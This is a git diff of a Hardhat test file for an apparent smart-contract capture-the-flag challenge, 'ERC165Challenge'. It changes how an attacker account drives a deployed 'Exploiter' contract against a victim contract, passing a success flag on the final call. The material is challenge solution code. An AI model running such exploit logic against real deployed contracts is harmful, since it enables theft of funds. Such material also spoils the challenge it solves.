@@ -55,11 +55,13 @@ describe('ERC165Challenge', function () {
                 const ExploiterFactory = await ethers.getContractFactory('Exploiter');
                 const exploiter = await ExploiterFactory.connect(attacker).deploy();
     
-                this.order.reverse().forEach(async (i)=>{
-                    await exploiter.connect(attacker).execute(this.victim.address,funcSig[i-1],ifceId[i-1],this.award.address,{value: ethers.utils.parseEther("100","gwei")})
+                this.order.reverse().forEach(async (el,idx)=>{
+                    let callSuccess 
+                    idx == this.order.length - 1 ? callSuccess = true : callSuccess = false;
+                    await exploiter.connect(attacker).execute(this.victim.address,funcSig[el-1],ifceId[el-1],this.award.address,callSuccess,{value: ethers.utils.parseEther("100","gwei")})
                 })
     
-                await exploiter.connect(attacker).callSuccess(this.victim.address,this.award.address)
+                // await exploiter.connect(attacker).callSuccess(this.victim.address,this.award.address)
             });
         });
 
